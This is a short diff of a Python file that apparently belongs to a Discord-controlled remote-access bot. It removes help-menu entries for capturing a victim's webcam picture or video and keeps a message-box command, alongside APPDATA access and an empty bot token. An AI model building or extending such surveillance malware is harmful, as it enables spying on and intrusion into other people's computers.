@@ -13,7 +13,6 @@ from ctypes import *
 import asyncio
 import discord
 import atexit
-global py
 token = ''
 global appdata
 appdata = os.getenv('APPDATA')
@@ -22,10 +21,6 @@ bot = commands.Bot(command_prefix='!')
 helpmenu = """
 
 Availaible commands are :
-
---> !webcampic = Take a picture from the webcam
-
---> !webcamvid = Take a video from webcam for selected amount of time /Syntax = "!webcamvid 7"
 
 --> !message = Show a message box
 
